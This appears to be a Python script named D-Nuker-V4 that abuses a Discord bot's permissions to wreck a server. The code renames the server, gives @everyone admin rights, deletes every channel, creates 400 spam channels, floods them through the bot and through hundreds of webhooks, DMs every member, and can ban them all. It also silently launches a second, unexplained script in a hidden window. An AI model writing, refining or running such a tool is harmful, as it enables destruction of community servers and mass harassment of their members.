import discord
import asyncio
import os
import subprocess
from colorama import Fore, init

# main config
ACTION_DELAY = 0.001
RETRY_COUNT = 3
NUM_CHANNELS = 400
NUM_WEBHOOKS = 400
NUM_BOT_MESSAGES = 10
NUM_WEBHOOK_MESSAGES = 100
SPAM_MESSAGE = "@everyone Nuked by TS — discord.gg/G23pf84q75"
CHANNEL_NAME = "NUKED BY TS (PLZ DONT @) -- D-Nuker-V4"
WEBHOOK_AVATAR = "https://i.ibb.co/pvYQRPzG/images-8.png"

# retry
init(autoreset=True)
os.chdir(os.path.dirname(os.path.abspath(__file__)))
def center(text, width=120): return text.center(width)

async def retry(func, *args, retries=RETRY_COUNT, delay=0.5, **kwargs):
    for attempt in range(retries):
        try:
            return await func(*args, **kwargs)
        except Exception as e:
            print(Fore.RED + f" Error: Error on attempt {attempt+1}/{retries}: {e}")
            await asyncio.sleep(delay)
    return None

# profile pic
subprocess.Popen(["python", "profile_pic_veiw.py"], creationflags=subprocess.CREATE_NO_WINDOW)

# banner
banner = [
    (Fore.RED,     "    ____                    __                        __ __"),
    (Fore.YELLOW,  "   / __ \\      ____  __  __/ /_____  _____     _   __/ // /"),
    (Fore.GREEN,   "  / / / /_____/ __ \\/ / / / //_/ _ \\/ ___/____| | / / // /_"),
    (Fore.CYAN,    " / /_/ /_____/ / / / /_/ / ,< /  __/ /  /_____/ |/ /__  __/"),
    (Fore.MAGENTA, "/_____/     /_/ /_/\\__,_/_/|_|\\___/_/         |___/  /_/   ")
]
print()
print(Fore.GREEN + center("Launched D-Nuker-V4 Successfully !"))
for color, line in banner:
    print(color + center(line))
print()
print(Fore.BLUE + center("Made By: TS (plz don't @)"))
print(Fore.YELLOW + center("D-Nuker-V4, A Simple But Fast Nuker"))
print(Fore.GREEN + center("Server: discord.gg/G23pf84q75"))
print(Fore.RED + center("If There Are Any Bugs, Report on My Discord"))
print()

# bot token loader
TOKEN_PATH = "bot_token.txt"
if not os.path.exists(TOKEN_PATH):
    print(Fore.RED + "Error: bot_token.txt not found!")
    exit()
with open(TOKEN_PATH, "r", encoding="utf-8") as f:
    TOKEN = f.read().strip()

# input handler/prompts
try:
    GUILD_ID = int(input(Fore.CYAN + "Enter Discord Server ID: "))
except ValueError:
    print(Fore.RED + "Error: Invalid ID.")
    exit()

print(Fore.BLUE + "\nDrag & drop an image to be set as the server icon:")
ICON_PATH = input("#>> ").strip('"')
if not os.path.exists(ICON_PATH):
    print(Fore.RED + "Error: File not found.")
    exit()

ban_prompt = input(Fore.RED + "\n Ban all members? (y/n): ").lower()

# bot setup
intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(Fore.GREEN + f"\n Seccesfully Logged in as {client.user}")
    guild = client.get_guild(GUILD_ID)
    if not guild:
        print(Fore.RED + "Error: Server not found, Is the Bot In It ?")
        await client.close()
        return

    try:
        with open(ICON_PATH, "rb") as f:
            await retry(guild.edit, name="TS NUKED YOU", icon=f.read())
            print(Fore.MAGENTA + " Server renamed and icon updated.")
    except Exception as e:
        print(Fore.RED + f"Error: Server edit failed: {e}")

    try:
        await retry(guild.default_role.edit, permissions=discord.Permissions.all())
        print(Fore.YELLOW + " @everyone granted admin.")
    except Exception as e:
        print(Fore.RED + f"Error: Failed to grant admin: {e}")

    print(Fore.RED + "\n Deleting all channels...")
    async def delete_channel(ch):
        await retry(ch.delete)
        print(Fore.RED + f" Deleted: {ch.name}")
    await asyncio.gather(*(delete_channel(c) for c in guild.channels))

    print(Fore.CYAN + f"\n Creating {NUM_CHANNELS} channels...")
    channels = []
    async def create_channel(i):
        ch = await retry(guild.create_text_channel, f"{CHANNEL_NAME}-{i}")
        if ch:
            channels.append(ch)
            print(Fore.CYAN + f" Created: {ch.name}")
    await asyncio.gather(*(create_channel(i+1) for i in range(NUM_CHANNELS)))

    print(Fore.MAGENTA + "\n Spamming with bot and the webhooks (retry safe)...")
    async def spam_channel(ch):
        # bot stuffs
        for i in range(NUM_BOT_MESSAGES):
            await retry(ch.send, SPAM_MESSAGE)
            print(Fore.GREEN + f" Bot message {i+1} in {ch.name}")
            await asyncio.sleep(ACTION_DELAY)

        # webhook stuffs
        for w in range(NUM_WEBHOOKS):
            webhook = await retry(ch.create_webhook, name=f"TS-Web-{w+1}")
            if not webhook: continue
            print(Fore.LIGHTMAGENTA_EX + f" Webhook #{w+1} created in {ch.name}")
            for i in range(NUM_WEBHOOK_MESSAGES):
                await retry(webhook.send, SPAM_MESSAGE, username="TS Nuker", avatar_url=WEBHOOK_AVATAR)
                print(Fore.MAGENTA + f" Webhook spam message {i+1} from {webhook.name} in {ch.name}")
                await asyncio.sleep(ACTION_DELAY)
    await asyncio.gather(*(spam_channel(ch) for ch in channels))

    print(Fore.CYAN + "\n DMing all members...")
    async def dm_member(m):
        if not m.bot:
            await retry(m.send, "Your server just got nuked by TS — discord.gg/G23pf84q75")
            print(Fore.CYAN + f" DM sent to: {m.name}")
    await asyncio.gather(*(dm_member(m) for m in guild.members))

    if ban_prompt == "y":
        print(Fore.RED + "\n Banning all members...")
        async def ban_member(m):
            if not m.bot and m != client.user:
                await retry(guild.ban, m, reason="Nuked by TS")
                print(Fore.RED + f" Banned: {m.name}")
        await asyncio.gather(*(ban_member(m) for m in guild.members))

    print(Fore.GREEN + "\n DONE: Nuke completed.")
    await client.close()

async def main():
    try:
        await client.start(TOKEN)
    except KeyboardInterrupt:
        print(Fore.RED + "\n User Interrupted.")
    finally:
        await client.close()

asyncio.run(main())
